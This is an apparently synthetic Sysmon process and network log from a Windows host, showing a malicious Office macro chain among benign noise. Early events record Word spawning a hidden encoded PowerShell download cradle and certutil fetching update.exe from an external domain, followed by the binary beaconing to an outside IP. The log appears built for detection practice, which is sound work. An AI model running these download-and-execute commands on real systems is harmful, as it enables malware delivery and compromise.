{"timestamp": "2024-05-07T10:22:33", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0AC4A", "ProcessId": 4260, "ParentProcessId": 4120, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=bb22cc33dd44"}
{"timestamp": "2024-05-07T10:22:49", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\certutil.exe", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "certutil.exe -urlcache -split -f http://update-cdn.top/win/update.exe C:\\ProgramData\\update.exe", "ProcessId": 4330, "ParentProcessId": 4260, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=cc33dd44ee55"}
{"timestamp": "2024-05-07T10:22:51", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 1452, "ParentProcessId": 1451, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=c7046a5a37eb02d2c263e39c6396e093b92bcd3afaee4ce02bdfa48aa859eb9c"}
{"timestamp": "2024-05-07T10:22:52", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": null, "CommandLine": null, "ProcessId": 1452, "ParentProcessId": null, "dest_ip": "142.250.185.68", "dest_port": 443, "Hashes": null}
{"timestamp": "2024-05-07T10:23:12", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "cmd.exe /c dir", "ProcessId": 1454, "ParentProcessId": 1453, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=205ad20811bd9a3ed784e7a9a929a2c1ec971bbe9ff68cd3cf12c463715ffd33"}
{"timestamp": "2024-05-07T10:23:16", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "cmd.exe /c dir", "ProcessId": 1456, "ParentProcessId": 1455, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=10d5685df20aa7aba8f7a56cb2b7bd6d2d85611713acdec50841d0ce58d20166"}
{"timestamp": "2024-05-07T10:23:16", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\ProgramData\\update.exe", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "\"C:\\ProgramData\\update.exe\"", "ProcessId": 4390, "ParentProcessId": 4260, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=9f2b3c8e1a774d0e55c6ab90f13e77aa42d8b6c0e9f4a1d2c3b4e5f60718293a"}
{"timestamp": "2024-05-07T10:23:21", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\ProgramData\\update.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 4390, "ParentProcessId": null, "dest_ip": "185.244.25.171", "dest_port": 443, "Hashes": null}
{"timestamp": "2024-05-07T10:23:23", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 1458, "ParentProcessId": 1457, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=b9a91ac934052fd9d3f81b4f58a8aeb7a1f9724c406e53b0c012f7207a320807"}
{"timestamp": "2024-05-07T10:23:31", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "OUTLOOK.EXE", "ProcessId": 1460, "ParentProcessId": 1459, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=0298188920ee0de4c01781f08d9f93a7cfb0ce504ad15082565959d7ad5f7afe"}
{"timestamp": "2024-05-07T10:24:02", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 1462, "ParentProcessId": 1461, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=6e69869d56a50ea4649e7238bf08704bf8f3838ba9a38a14e90bbfc25cad7a41"}
{"timestamp": "2024-05-07T10:24:35", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1464, "ParentProcessId": 1463, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=6231d2fefc42f760ef7d53b77b10f2e1d69e79f65f8287b732027f99b54d78d0"}
{"timestamp": "2024-05-07T10:24:53", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1466, "ParentProcessId": 1465, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=7e9da96bd142276d931f3d8378a10eec4985bf9e57723856829d35caa61fcb6b"}
{"timestamp": "2024-05-07T10:25:02", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\MsMpEng.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "MsMpEng.exe", "ProcessId": 1468, "ParentProcessId": 1467, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=cd367619908dee600eec63521506542c5532b1e73aa45bf47875d997438ed8cc"}
{"timestamp": "2024-05-07T10:25:15", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\ProgramData\\update.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 4390, "ParentProcessId": null, "dest_ip": "185.244.25.171", "dest_port": 443, "Hashes": null}
{"timestamp": "2024-05-07T10:25:42", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1470, "ParentProcessId": 1469, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=092cd64b9c91d847fa9f7be0ccbbcfd212615500fbc5b85e8c9ac2add46c91de"}
{"timestamp": "2024-05-07T10:25:43", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 1470, "ParentProcessId": null, "dest_ip": "10.10.20.10", "dest_port": 443, "Hashes": null}
{"timestamp": "2024-05-07T10:25:48", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1472, "ParentProcessId": 1471, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=22e5fd9061fa73286cb84be6be1e9f3099f761365a902c624bee6ee9e8049abf"}
{"timestamp": "2024-05-07T10:26:27", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 1474, "ParentProcessId": 1473, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=99a9a052bb054db24345cdec3070e426435f64a24ae2a6c7024117c71cd67641"}
{"timestamp": "2024-05-07T10:26:34", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "OUTLOOK.EXE", "ProcessId": 1476, "ParentProcessId": 1475, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=b4a31a6fed6486a961f6dd607fdb9b7d7e2d804be3c99a96885e5bd34de65e9a"}
{"timestamp": "2024-05-07T10:26:45", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1478, "ParentProcessId": 1477, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=0afab62db574da2c2ff12fc0d303d0f722784fdc5f614c072ab2c415166c1c67"}
{"timestamp": "2024-05-07T10:27:15", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1480, "ParentProcessId": 1479, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=d7875666efb8a57c5d0d92b72c9037c70fe37ae2001ddc276456d9fda38607ea"}
{"timestamp": "2024-05-07T10:27:32", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\MsMpEng.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "MsMpEng.exe", "ProcessId": 1482, "ParentProcessId": 1481, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=7626e73ce271394332b72673530935dbc8681f3aae2b82211d3ec9a6b2ae3838"}
{"timestamp": "2024-05-07T10:27:47", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1484, "ParentProcessId": 1483, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=41d1b4a7307b6d1b4a8d78772eb405472ab0d867c0f46094d390a55d0d38f6cb"}
{"timestamp": "2024-05-07T10:28:19", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 1486, "ParentProcessId": 1485, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=f464c3edcc40dd422d345c739238f01ce9ca6555daab9c847b7634812419e60b"}
{"timestamp": "2024-05-07T10:28:41", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1488, "ParentProcessId": 1487, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=021cc4a16b5059ab1355fc707efb8bbb1a2956917de14395c6c0794ff49d8246"}
{"timestamp": "2024-05-07T10:28:42", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 1488, "ParentProcessId": null, "dest_ip": "10.10.20.10", "dest_port": 443, "Hashes": null}
{"timestamp": "2024-05-07T10:28:57", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 1490, "ParentProcessId": 1489, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=bdea67b6b11b26c3819bb10a8c623fe09e9479ebdf26f6e984ce492162d23888"}
{"timestamp": "2024-05-07T10:29:25", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 1492, "ParentProcessId": 1491, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=95a1395a416ec771eaa4fc838a6ecf853b7e8979d1706f0adcc52301fb849f0a"}
{"timestamp": "2024-05-07T10:29:38", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\MsMpEng.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "MsMpEng.exe", "ProcessId": 1494, "ParentProcessId": 1493, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=826ba22657d5e8cb4e5b4a26d3cbe5807753f62e618a55b14413afe42d0dbe31"}
{"timestamp": "2024-05-07T10:29:47", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\MsMpEng.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "MsMpEng.exe", "ProcessId": 1496, "ParentProcessId": 1495, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=5942760e8dad781b2ea7b0c027e1de90dd6e30b15b574c490b6dff3056cd4411"}
{"timestamp": "2024-05-07T10:30:05", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1498, "ParentProcessId": 1497, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=c22142d01c04d05de47f0f3fad4227ec6152d47a629d8e928e25f2c0dc189aa7"}
{"timestamp": "2024-05-07T10:30:39", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\MsMpEng.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "MsMpEng.exe", "ProcessId": 1500, "ParentProcessId": 1499, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=fae64b88eb7dac3c87560977b4d3c560f62f684c018f7228c87bfb6aa622cab2"}
{"timestamp": "2024-05-07T10:30:51", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 1502, "ParentProcessId": 1501, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=88239ff218bf2fb05f43f63e8f82205379a69da148fdfad1a6dc72860eb5f090"}
{"timestamp": "2024-05-07T10:31:14", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1504, "ParentProcessId": 1503, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=1edde5808c8ab48c27a511c2b07541a2bf6519ce924e5332532fd00c53562562"}
{"timestamp": "2024-05-07T10:31:21", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 1506, "ParentProcessId": 1505, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=68765416139c65fb55340a93ab1da6e81210f51beb70aeaf8fb97906898e3df4"}
{"timestamp": "2024-05-07T10:31:22", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 1506, "ParentProcessId": null, "dest_ip": "13.107.42.14", "dest_port": 80, "Hashes": null}
{"timestamp": "2024-05-07T10:31:36", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\MsMpEng.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "MsMpEng.exe", "ProcessId": 1508, "ParentProcessId": 1507, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=91942d620e285cf54b9b1538c7db80c3b749f09619de6641d28dd3243890f16f"}
{"timestamp": "2024-05-07T10:31:46", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1510, "ParentProcessId": 1509, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=c23a00cfab728e95ebf5b50c37cc6f2698a65bb612a65a08f3b1c4b6b0b1452d"}
{"timestamp": "2024-05-07T10:32:16", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 1512, "ParentProcessId": 1511, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=edddf0ce37d487427e504555fd477c0d82636bbb9852f930dfb638290e2b2989"}
{"timestamp": "2024-05-07T10:32:46", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1514, "ParentProcessId": 1513, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=c1ab6af609a8251149ae900bd9bd69578e685faeffe516046283b53ee3bdc415"}
{"timestamp": "2024-05-07T10:33:08", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1516, "ParentProcessId": 1515, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=df8c7560229dd2ec2930aca6e4410508ce70ac6ab68b5529bc00c9e075bea550"}
{"timestamp": "2024-05-07T10:33:44", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 1518, "ParentProcessId": 1517, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=456508f9b34efb934f95141093e1f6d4677af789c90400014786a09cd6a64626"}
{"timestamp": "2024-05-07T10:34:07", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1520, "ParentProcessId": 1519, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=0379723843f6b139ab9b3a0e9eaa69418394a79e6095fb30cb1b8826838f2240"}
{"timestamp": "2024-05-07T10:34:15", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\MsMpEng.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "MsMpEng.exe", "ProcessId": 1522, "ParentProcessId": 1521, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=187ea21afc23c620e5d77e65eac583b7edc87bed72658f744bd8e0c4851e99b9"}
{"timestamp": "2024-05-07T10:34:44", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1524, "ParentProcessId": 1523, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=ba7450a3b45e395ce0f20188ab7aa6a9c368c59bd18794c04aa97c983845c368"}
